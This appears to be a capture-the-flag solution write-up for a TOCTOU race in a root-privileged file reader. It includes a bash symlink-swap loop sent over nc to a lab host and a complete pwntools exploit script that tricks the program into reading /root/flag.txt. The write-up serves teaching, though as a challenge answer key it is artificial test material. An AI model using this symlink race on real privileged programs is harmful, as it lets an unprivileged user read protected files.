# pwn-race-condition — Solution

## Vulnerability
Classic TOCTOU (Time-of-Check Time-of-Use):
1. `access(path, R_OK)` — checks with **real UID** (ctf, unprivileged)
2. `sleep(2)` — 2-second window!
3. `fopen(path, "r")` — opens with **effective UID** (root)

**Attack**: pass a file you own, then swap it to a symlink to `/root/flag.txt` during the sleep.

## Exploitation

### Manual approach
```bash
# Terminal 1: create the bait file
echo "bait" > /tmp/myfile

# Terminal 2: race loop — keep swapping the symlink
while true; do
    ln -sf /tmp/myfile /tmp/race 2>/dev/null
    ln -sf /root/flag.txt /tmp/race 2>/dev/null
done &

# Terminal 1: connect and send the symlink path
echo /tmp/race | nc 172.30.2.31 9998
```

### Automated exploit
```python
from pwn import *
import time, threading, os

HOST = '172.30.2.31'
PORT = 9998

# Create a benign file we own
os.makedirs('/tmp/race_dir', exist_ok=True)
bait = '/tmp/race_dir/bait.txt'
link = '/tmp/race_dir/target'
with open(bait, 'w') as f: f.write('bait\n')

# Make initial symlink point to bait (access() will pass)
try: os.unlink(link)
except: pass
os.symlink(bait, link)

def swap_loop():
    """Swap symlink between bait and flag rapidly"""
    target = '/root/flag.txt'
    for _ in range(200):
        try:
            os.unlink(link)
            os.symlink(target, link)
            time.sleep(0.01)
            os.unlink(link)
            os.symlink(bait, link)
            time.sleep(0.01)
        except:
            pass

# Start swapping in background
t = threading.Thread(target=swap_loop, daemon=True)
t.start()

# Connect and send the symlink path
p = remote(HOST, PORT)
p.sendlineafter(b'Enter file path: ', link.encode())
p.recvuntil(b'Checking permissions')

# During sleep(2), the swap_loop should flip to /root/flag.txt
time.sleep(0.5)

output = p.recvall(timeout=5)
print(output.decode())
```

## Notes
- The 2-second sleep makes this very easy to race
- Run multiple connections in parallel to increase success probability
- If the symlink is pointing to bait when `access()` runs, it passes. If it's pointing to flag when `fopen()` runs, root opens the flag.
- This works because `access()` and `fopen()` resolve the symlink independently
